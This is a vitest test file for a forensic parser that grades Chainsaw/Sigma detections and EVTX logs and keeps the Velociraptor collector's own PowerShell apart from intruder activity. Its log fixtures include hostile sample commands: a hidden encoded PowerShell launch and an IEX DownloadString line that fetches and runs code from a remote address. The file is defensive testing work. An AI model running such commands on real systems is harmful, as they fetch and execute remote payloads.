import { describe, it, expect } from "vitest";
import { parseChainsawReport } from "../../src/analysis/chainsawImport.js";

// ── A Chainsaw hunt detection: a Sigma rule matched on an embedded Sysmon process-create.
function sigmaPowershell() {
  return {
    group: "Sigma",
    kind: "individual",
    document: {
      kind: "evtx",
      path: "Sysmon.evtx",
      data: {
        Event: {
          System: {
            Provider: { "#attributes": { Name: "Microsoft-Windows-Sysmon" } },
            EventID: 1,
            Channel: "Microsoft-Windows-Sysmon/Operational",
            Computer: "WIN-DC01.corp.local",
            TimeCreated: { "#attributes": { SystemTime: "2023-01-02T10:00:00.000Z" } },
          },
          EventData: {
            UtcTime: "2023-01-02 10:00:00.000",
            Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            CommandLine: "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
            ParentImage: "C:\\Program Files\\Microsoft Office\\winword.exe",
            Hashes:
              "SHA256=aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899,MD5=00112233445566778899aabbccddeeff",
          },
        },
      },
    },
    rule: {
      name: "Suspicious Encoded PowerShell Command Line",
      level: "high",
      tags: ["attack.execution", "attack.t1059.001"],
    },
    timestamp: "2023-01-02T10:00:00.000Z",
  };
}

// ── A raw evtx_dump record (named EventData object), no Chainsaw verdict.
function rawFailedLogon(): object {
  return {
    Event: {
      System: {
        Provider: { "#attributes": { Name: "Microsoft-Windows-Security-Auditing" } },
        EventID: 4625,
        Channel: "Security",
        Computer: "WS01",
        TimeCreated: { "#attributes": { SystemTime: "2023-01-02T09:00:00Z" } },
      },
      EventData: { TargetUserName: "admin", TargetDomainName: "CORP", IpAddress: "10.0.0.5", LogonType: "3" },
    },
  };
}

// ── A raw evtx_dump record using the { Data: [ {@Name,#text} ] } EventData form.
function rawLogonDataArray(): object {
  return {
    Event: {
      System: {
        EventID: { "#text": "4624" },
        Channel: "Security",
        Computer: "WS02",
        TimeCreated: { "#attributes": { SystemTime: "2023-01-02T08:00:00Z" } },
      },
      EventData: {
        Data: [
          { "@Name": "TargetUserName", "#text": "bob" },
          { "@Name": "TargetDomainName", "#text": "CORP" },
          { "@Name": "IpAddress", "#text": "::ffff:192.168.1.7" },
          { "@Name": "LogonType", "#text": "3" },
        ],
      },
    },
  };
}

describe("parseChainsawReport — Chainsaw hunt detections", () => {
  it("maps a Sigma detection: rule name leads, level → severity, tags → MITRE", () => {
    const r = parseChainsawReport(JSON.stringify([sigmaPowershell()]));
    expect(r.format).toBe("chainsaw");
    expect(r.detections).toBe(1);
    expect(r.events).toHaveLength(1);
    const e = r.events[0];
    expect(e.description).toContain("Chainsaw/Sigma: Suspicious Encoded PowerShell Command Line");
    expect(e.severity).toBe("High"); // Sigma high (≥ the EVTX-derived Medium)
    expect(e.mitreTechniques).toContain("T1059.001"); // from the attack tag
    expect(e.asset).toBe("WIN-DC01.corp.local");
    expect(e.sources).toEqual(["Chainsaw"]);
    expect(e.processName).toBe("powershell.exe");
    expect(e.parentName).toBe("winword.exe");
    expect(e.sha256).toBe("aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899");
    expect(e.timestamp).toBe("2023-01-02T10:00:00.000Z"); // Sysmon UtcTime, the event's own clock
  });

  it("extracts IOCs (hash, file, process) from the embedded event", () => {
    const r = parseChainsawReport(JSON.stringify([sigmaPowershell()]));
    const kinds = r.iocs.map((i) => i.type);
    expect(kinds).toContain("hash");
    expect(kinds).toContain("process");
    expect(kinds).toContain("file");
    expect(r.iocs.find((i) => i.type === "process")?.value).toBe("powershell.exe");
  });

  it("keeps two DIFFERENT rules on the same underlying event as separate events", () => {
    const a = sigmaPowershell();
    const b = sigmaPowershell();
    b.rule = { name: "Office Spawning PowerShell", level: "critical", tags: ["attack.t1059"] };
    const r = parseChainsawReport(JSON.stringify([a, b]));
    expect(r.events).toHaveLength(2);
    expect(r.events.some((e) => e.description.includes("Office Spawning PowerShell"))).toBe(true);
  });

  it("aggregates the SAME rule firing on identical events into a counted row", () => {
    const r = parseChainsawReport(JSON.stringify([sigmaPowershell(), sigmaPowershell()]));
    expect(r.events).toHaveLength(1);
    expect(r.events[0].count).toBe(2);
  });

  it("expands an aggregate detection's documents[] into per-event rows", () => {
    const agg = {
      group: "Sigma",
      kind: "aggregate",
      documents: [sigmaPowershell().document, sigmaPowershell().document],
      rule: { name: "Brute Force Burst", level: "medium", tags: ["attack.t1110"] },
    };
    const r = parseChainsawReport(JSON.stringify([agg]));
    expect(r.detections).toBe(1);
    // Two identical embedded docs under one rule collapse into a counted row.
    expect(r.events).toHaveLength(1);
    expect(r.events[0].count).toBe(2);
    expect(r.events[0].mitreTechniques).toContain("T1110");
  });

  it("keeps a detection's verdict even when it carries no embedded EVTX event", () => {
    const r = parseChainsawReport(
      JSON.stringify([
        {
          group: "Antivirus",
          kind: "individual",
          name: "Defender Threat",
          level: "high",
          tags: ["attack.t1204"],
          timestamp: "2023-01-02T11:00:00Z",
        },
      ]),
    );
    expect(r.detections).toBe(1);
    expect(r.events).toHaveLength(1);
    expect(r.events[0].severity).toBe("High");
    expect(r.events[0].description).toContain("Chainsaw/Antivirus: Defender Threat");
  });
});

describe("parseChainsawReport — raw EVTX dumps (no verdict)", () => {
  it("maps a bare { Event } record with per-EID severity, tagged EVTX", () => {
    const r = parseChainsawReport(JSON.stringify([rawFailedLogon()]));
    expect(r.format).toBe("evtx");
    expect(r.detections).toBe(0);
    expect(r.events).toHaveLength(1);
    const e = r.events[0];
    expect(e.severity).toBe("Medium"); // 4625 failed logon
    expect(e.asset).toBe("WS01");
    expect(e.sources).toEqual(["EVTX"]);
    expect(r.iocs.find((i) => i.type === "ip")?.value).toBe("10.0.0.5");
  });

  it("normalizes the { Data: [ {@Name,#text} ] } EventData form and unwraps ::ffff: IPs", () => {
    const r = parseChainsawReport(JSON.stringify([rawLogonDataArray()]));
    expect(r.events).toHaveLength(1);
    expect(r.events[0].description).toContain("EID 4624");
    expect(r.iocs.find((i) => i.type === "ip")?.value).toBe("192.168.1.7");
  });

  it("reads NDJSON (evtx_dump -o jsonl)", () => {
    const text = [JSON.stringify(rawFailedLogon()), JSON.stringify(rawLogonDataArray())].join("\n");
    const r = parseChainsawReport(text);
    expect(r.format).toBe("evtx");
    expect(r.events).toHaveLength(2);
  });
});

// ── The flattened shape seen from a Velociraptor artifact that shells out to Chainsaw with
// a Sigma event-log mapping: verdict at the top level, SystemData/_attributes instead of
// Event.System, no attack tags.
function flatSigmaFirewallRule(): object {
  return {
    EventTime: "2025-12-05T02:43:41.735285Z",
    Detection: "Uncommon New Firewall Rule Added In Windows Firewall Exception List",
    Severity: "medium",
    Status: "experimental",
    "Rule Group": "Sigma",
    Computer: "WIN-CASEHOST7",
    Channel: "Microsoft-Windows-Windows Firewall With Advanced Security/Firewall",
    EventID: 2097,
    SystemData: {
      EventID: 2097,
      Level: 4,
      Provider_attributes: { Name: "Microsoft-Windows-Windows Firewall With Advanced Security" },
      TimeCreated_attributes: { SystemTime: "2025-12-05T02:43:41.735285Z" },
      EventRecordID: 229,
      Channel: "Microsoft-Windows-Windows Firewall With Advanced Security/Firewall",
      Computer: "WIN-CASEHOST7",
    },
    EventData: { RuleName: "SSHD Port OpenSSH (chocolatey package: openssh)", LocalPorts: "22" },
    Authors: ["frack113"],
  };
}

// ── The same shape with no verdict fired at Info (bare telemetry, e.g. RDS session events).
function flatInfoRdsEvent(): object {
  return {
    EventTime: "2025-12-05T02:41:39.012742Z",
    Detection: "User Profile Disk - Registry file loaded",
    Severity: "info",
    Status: "stable",
    "Rule Group": "Microsoft RDS Events - User Profile Disk",
    Computer: "WIN-CASEHOST7",
    Channel: "Microsoft-Windows-User Profile Service/Operational",
    EventID: 5,
    SystemData: {
      EventID: 5,
      Provider_attributes: { Name: "Microsoft-Windows-User Profiles Service" },
      TimeCreated_attributes: { SystemTime: "2025-12-05T02:41:39.012742Z" },
      Computer: "WIN-CASEHOST7",
    },
    EventData: { File: "C:\\Users\\defaultuser0\\ntuser.dat" },
    Authors: ["Catarina de Faria"],
  };
}

describe("parseChainsawReport — flat Chainsaw/Sigma JSON (Velociraptor-shelled-out shape)", () => {
  it("maps a flat Sigma detection: Detection leads, Severity → severity, no MITRE tags", () => {
    const r = parseChainsawReport(JSON.stringify([flatSigmaFirewallRule()]));
    expect(r.format).toBe("chainsaw");
    expect(r.detections).toBe(1);
    expect(r.events).toHaveLength(1);
    const e = r.events[0];
    expect(e.description).toContain(
      "Chainsaw/Sigma: Uncommon New Firewall Rule Added In Windows Firewall Exception List",
    );
    expect(e.severity).toBe("Medium");
    expect(e.asset).toBe("WIN-CASEHOST7");
    expect(e.sources).toEqual(["Chainsaw"]);
    expect(e.timestamp).toBe("2025-12-05T02:43:41.735285Z"); // the event's own EventTime
  });

  it("keeps an Info-graded flat detection (no verdict bump) but still tags it Chainsaw", () => {
    const r = parseChainsawReport(JSON.stringify([flatInfoRdsEvent()]));
    expect(r.events).toHaveLength(1);
    expect(r.events[0].severity).toBe("Info");
    expect(r.events[0].description).toContain(
      "Chainsaw/Microsoft RDS Events - User Profile Disk: User Profile Disk - Registry file loaded",
    );
  });

  it("reads NDJSON of the flat shape and aggregates per distinct rule", () => {
    const text = [JSON.stringify(flatSigmaFirewallRule()), JSON.stringify(flatInfoRdsEvent())].join("\n");
    const r = parseChainsawReport(text);
    expect(r.detections).toBe(2);
    expect(r.events).toHaveLength(2);
    expect(r.hostname).toBe("WIN-CASEHOST7");
  });

  it("does not mistake a nested-document Chainsaw record for the flat shape", () => {
    const r = parseChainsawReport(JSON.stringify([sigmaPowershell()]));
    expect(r.events[0].description).toContain("Chainsaw/Sigma: Suspicious Encoded PowerShell Command Line");
  });
});

describe("parseChainsawReport — options & edge cases", () => {
  it("applies a minSeverity floor", () => {
    const text = JSON.stringify([sigmaPowershell(), rawLogonDataArray()]); // High + Low(4624)
    const r = parseChainsawReport(text, { minSeverity: "Medium" });
    expect(r.events).toHaveLength(1); // the Low 4624 dropped
    expect(r.events[0].severity).toBe("High");
  });

  it("reports empty for a non-record file", () => {
    const r = parseChainsawReport("not json at all");
    expect(r.format).toBe("empty");
    expect(r.events).toHaveLength(0);
  });

  it("reads a mixed Chainsaw + EVTX array as a Chainsaw report", () => {
    const r = parseChainsawReport(JSON.stringify([sigmaPowershell(), rawFailedLogon()]));
    expect(r.detections).toBe(1);
    expect(r.format).toBe("chainsaw");
    expect(r.events).toHaveLength(2);
  });
});

// ── The collector's own PowerShell, as the Chainsaw export of INC-2026-032 carried it (#1488).
//
// Windows.Forensics.PersistenceSniper makes the Velociraptor client spawn a SYSTEM powershell.exe
// that imports PersistenceSniper.psm1 from the collector's tool tree. Every script block that module
// logs (EID 4104) is Sigma-graded like an intruder's — "Potential WinAPI Calls Via PowerShell
// Scripts" is High — and a Chainsaw export routes here, where the #1477 rule the Velociraptor path
// applies never ran. The rows carry two facts the engine wrote, not the script: the script `Path`
// (under the tool tree) and the engine's own process id, which equals the Sysmon `ProcessId` of the
// spawned powershell.exe.
const TOOLS = "C:\\Program Files\\Velociraptor\\Tools\\tmp2712975309";
const SNIPER_PSM1 = `${TOOLS}\\PersistenceSniper\\PersistenceSniper.psm1`;
const SPAWN_TIME = "2026-09-20T19:34:56.972234Z";
const SYSTEM_SID = "S-1-5-18";
const USER_SID = "S-1-5-21-908230818-3748298786-230204725-1001";

function flatCollectorSpawn(over: { time?: string; pid?: number } = {}): object {
  const time = over.time ?? SPAWN_TIME;
  return {
    EventTime: time,
    Detection: "Change PowerShell Policies to an Insecure Level",
    Severity: "medium",
    Status: "experimental",
    "Rule Group": "Sigma",
    Computer: "DESKTOP-16OJFO6",
    Channel: "Microsoft-Windows-Sysmon/Operational",
    EventID: 1,
    _User: "NT AUTHORITY\\SYSTEM",
    SystemData: {
      Channel: "Microsoft-Windows-Sysmon/Operational",
      Computer: "DESKTOP-16OJFO6",
      EventID: 1,
      EventRecordID: 2201,
      Execution_attributes: { ProcessID: 3556, ThreadID: 4844 },
      Provider_attributes: { Name: "Microsoft-Windows-Sysmon" },
      Security_attributes: { UserID: SYSTEM_SID },
      TimeCreated_attributes: { SystemTime: time },
    },
    EventData: {
      UtcTime: time.replace("T", " ").replace("Z", ""),
      CommandLine: `powershell -ExecutionPolicy bypass -command "import-module \\"${SNIPER_PSM1}\\"; Find-AllPersistence -DiffCSV \\"${TOOLS}\\false_positives.csv\\""`,
      Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      IntegrityLevel: "System",
      ParentCommandLine:
        '"C:\\Program Files\\Velociraptor\\Velociraptor.exe"  --config "C:\\Program Files\\Velociraptor\\/client.config.yaml" service run ',
      ParentImage: "C:\\Program Files\\Velociraptor\\Velociraptor.exe",
      ParentProcessId: 3176,
      ParentUser: "NT AUTHORITY\\SYSTEM",
      ProcessId: over.pid ?? 10932,
      User: "NT AUTHORITY\\SYSTEM",
    },
    Authors: ["frack113"],
  };
}

// A script-block row of that process. `path` "" = a block compiled from the command line, which
// carries no EventData.Path at all.
function flatScriptBlock(
  over: {
    time?: string;
    pid?: number;
    path?: string;
    sid?: string;
    severity?: string;
    detection?: string;
    text?: string;
  } = {},
): object {
  const time = over.time ?? "2026-09-20T19:35:00.357240Z";
  const path = over.path ?? SNIPER_PSM1;
  return {
    EventTime: time,
    Detection: over.detection ?? "Potential WinAPI Calls Via PowerShell Scripts",
    Severity: over.severity ?? "high",
    Status: "test",
    "Rule Group": "Sigma",
    Computer: "DESKTOP-16OJFO6",
    Channel: "Microsoft-Windows-PowerShell/Operational",
    EventID: 4104,
    _User: null,
    SystemData: {
      Channel: "Microsoft-Windows-PowerShell/Operational",
      Computer: "DESKTOP-16OJFO6",
      EventID: 4104,
      EventRecordID: 9001,
      Execution_attributes: { ProcessID: over.pid ?? 10932, ThreadID: 1 },
      Provider_attributes: { Name: "Microsoft-Windows-PowerShell" },
      Security_attributes: { UserID: over.sid ?? SYSTEM_SID },
      TimeCreated_attributes: { SystemTime: time },
    },
    EventData: {
      MessageNumber: 1,
      MessageTotal: 1,
      ...(path ? { Path: path } : {}),
      ScriptBlockId: "88fae63e-7c27-4ecc-a97f-002d787157c8",
      ScriptBlockText:
        over.text ??
        "Add-Type -TypeDefinition @'\r\npublic class AdjPriv { [DllImport(\"advapi32.dll\")] internal static extern bool AdjustTokenPrivileges(); }\r\n'@",
    },
    Authors: ["Nasreddine Bencherchali"],
  };
}

const TOOL_TREE_NOTE = "[DFIR collector footprint — script the Velociraptor client ran from its tool tree]";
const SPAWNED_NOTE =
  "[DFIR collector footprint — script block of the process the Velociraptor client spawned]";

describe("parseChainsawReport — script blocks of the PowerShell the collector spawned (#1488)", () => {
  const scriptRows = (r: ReturnType<typeof parseChainsawReport>) =>
    r.events.filter((e) => e.description.includes("(EID 4104)"));

  it("grades a High script block from the collector's tool tree Info, with the note and origin", () => {
    const r = parseChainsawReport(JSON.stringify([flatCollectorSpawn(), flatScriptBlock()]));
    const [sb] = scriptRows(r);
    expect(sb.severity).toBe("Info");
    expect(sb.origin).toBe("collector");
    expect(sb.description).toContain(TOOL_TREE_NOTE);
  });

  it("needs no spawn row for the tool-tree rule", () => {
    const [sb] = scriptRows(parseChainsawReport(JSON.stringify([flatScriptBlock()])));
    expect(sb.severity).toBe("Info");
  });

  it("grades a path-less block of the spawned process Info by its process id", () => {
    const rows = [
      flatCollectorSpawn(),
      flatScriptBlock({
        path: "",
        severity: "medium",
        detection: "Powershell Create Scheduled Task",
        time: "2026-09-20T19:35:26.771229Z",
      }),
    ];
    const [sb] = scriptRows(parseChainsawReport(JSON.stringify(rows)));
    expect(sb.severity).toBe("Info");
    expect(sb.origin).toBe("collector");
    expect(sb.description).toContain(SPAWNED_NOTE);
  });

  it("claims the block whichever order the file lists the rows in", () => {
    const rows = [flatScriptBlock({ path: "", severity: "medium" }), flatCollectorSpawn()];
    const [sb] = scriptRows(parseChainsawReport(JSON.stringify(rows)));
    expect(sb.severity).toBe("Info");
  });

  it("the spawn row itself is graded as the collector's, as before", () => {
    const r = parseChainsawReport(JSON.stringify([flatCollectorSpawn()]));
    expect(r.events[0].severity).toBe("Info");
    expect(r.events[0].origin).toBe("collector");
  });

  // Each refusal below is a row an intruder could produce.
  it("keeps a High block that names a path outside the tool tree, even with the collector's pid", () => {
    const rows = [flatCollectorSpawn(), flatScriptBlock({ path: "C:\\Users\\vagrant\\Desktop\\priv.ps1" })];
    const [sb] = scriptRows(parseChainsawReport(JSON.stringify(rows)));
    expect(sb.severity).toBe("High");
    expect(sb.origin).toBeUndefined();
  });

  it("keeps a tool-tree block that did not run as SYSTEM", () => {
    const [sb] = scriptRows(
      parseChainsawReport(JSON.stringify([flatCollectorSpawn(), flatScriptBlock({ sid: USER_SID })])),
    );
    expect(sb.severity).toBe("High");
  });

  it("keeps a path-less block under a user SID, even with the collector's pid", () => {
    const rows = [flatCollectorSpawn(), flatScriptBlock({ path: "", sid: USER_SID })];
    expect(scriptRows(parseChainsawReport(JSON.stringify(rows)))[0].severity).toBe("High");
  });

  it("keeps a path-less SYSTEM block with another pid", () => {
    const rows = [flatCollectorSpawn(), flatScriptBlock({ path: "", pid: 4340 })];
    expect(scriptRows(parseChainsawReport(JSON.stringify(rows)))[0].severity).toBe("High");
  });

  it("keeps a path-less block logged before the spawn or long after it", () => {
    const before = [flatCollectorSpawn(), flatScriptBlock({ path: "", time: "2026-09-20T19:34:00Z" })];
    const late = [flatCollectorSpawn(), flatScriptBlock({ path: "", time: "2026-09-20T21:35:00Z" })];
    expect(scriptRows(parseChainsawReport(JSON.stringify(before)))[0].severity).toBe("High");
    expect(scriptRows(parseChainsawReport(JSON.stringify(late)))[0].severity).toBe("High");
  });

  it("keeps a path-less block once the pid has been reused by a later process", () => {
    const reuse = {
      ...(flatCollectorSpawn({ time: "2026-09-20T19:35:10Z" }) as Record<string, unknown>),
      Detection: "Suspicious Process Creation",
      EventData: {
        UtcTime: "2026-09-20 19:35:10.000",
        CommandLine: "cmd.exe /c whoami",
        Image: "C:\\Windows\\System32\\cmd.exe",
        ParentImage: "C:\\Windows\\explorer.exe",
        ProcessId: 10932,
        User: "DESKTOP-16OJFO6\\vagrant",
      },
    };
    const rows = [flatCollectorSpawn(), reuse, flatScriptBlock({ path: "", time: "2026-09-20T19:35:20Z" })];
    expect(scriptRows(parseChainsawReport(JSON.stringify(rows)))[0].severity).toBe("High");
  });

  it("never lowers a Critical", () => {
    const rows = [
      flatCollectorSpawn(),
      flatScriptBlock({ severity: "critical" }),
      flatScriptBlock({
        path: "",
        severity: "critical",
        text: "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')",
      }),
    ];
    for (const sb of scriptRows(parseChainsawReport(JSON.stringify(rows))))
      expect(sb.severity).toBe("Critical");
  });

  it("keeps a tool-tree block on the (x86) folder, which the 64-bit MSI never writes (#1486)", () => {
    const path =
      "C:\\Program Files (x86)\\Velociraptor\\Tools\\tmp1\\PersistenceSniper\\PersistenceSniper.psm1";
    expect(scriptRows(parseChainsawReport(JSON.stringify([flatScriptBlock({ path })])))[0].severity).toBe(
      "High",
    );
  });

  // The nested Chainsaw shapes carry the same facts under the evtx crate's spellings.
  function nestedScriptBlock(
    path: string,
    sid = SYSTEM_SID,
    text = "Add-Type -TypeDefinition 'AdjustTokenPrivileges'",
  ): object {
    return {
      System: {
        Provider: { "#attributes": { Name: "Microsoft-Windows-PowerShell" } },
        EventID: { "#text": 4104 },
        Channel: "Microsoft-Windows-PowerShell/Operational",
        Computer: "DESKTOP-16OJFO6",
        Execution: { "#attributes": { ProcessID: 10932, ThreadID: 1 } },
        Security: { "#attributes": { UserID: sid } },
        TimeCreated: { "#attributes": { SystemTime: "2026-09-20T19:35:00.357240Z" } },
      },
      EventData: { Path: path, ScriptBlockText: text },
    };
  }
  const nestedRule = {
    name: "Potential WinAPI Calls Via PowerShell Scripts",
    level: "high",
    tags: ["attack.t1106"],
  };

  it("grades a nested document.data.Event tool-tree block Info", () => {
    const rec = {
      group: "Sigma",
      kind: "individual",
      document: { kind: "evtx", data: { Event: nestedScriptBlock(SNIPER_PSM1) } },
      rule: nestedRule,
      timestamp: "2026-09-20T19:35:00Z",
    };
    const [sb] = scriptRows(parseChainsawReport(JSON.stringify([rec])));
    expect(sb.severity).toBe("Info");
    expect(sb.description).toContain(TOOL_TREE_NOTE);
  });

  it("judges each event of an aggregate detection's documents[] on its own", () => {
    const rec = {
      group: "Sigma",
      kind: "aggregate",
      documents: [
        { kind: "evtx", data: { Event: nestedScriptBlock(SNIPER_PSM1) } },
        // A different body, or the two rows would share one aggregation key and collapse.
        {
          kind: "evtx",
          data: {
            Event: nestedScriptBlock(
              "C:\\Users\\vagrant\\evil.ps1",
              USER_SID,
              "Add-Type 'AdjustTokenPrivileges'; whoami",
            ),
          },
        },
      ],
      rule: nestedRule,
      timestamp: "2026-09-20T19:35:00Z",
    };
    const sbs = scriptRows(parseChainsawReport(JSON.stringify([rec])));
    expect(sbs.map((e) => e.severity).sort()).toEqual(["High", "Info"]);
  });

  it("grades a bare { Event } dump's tool-tree block Info", () => {
    const [sb] = scriptRows(parseChainsawReport(JSON.stringify([{ Event: nestedScriptBlock(SNIPER_PSM1) }])));
    expect(sb.severity).toBe("Info");
  });
});
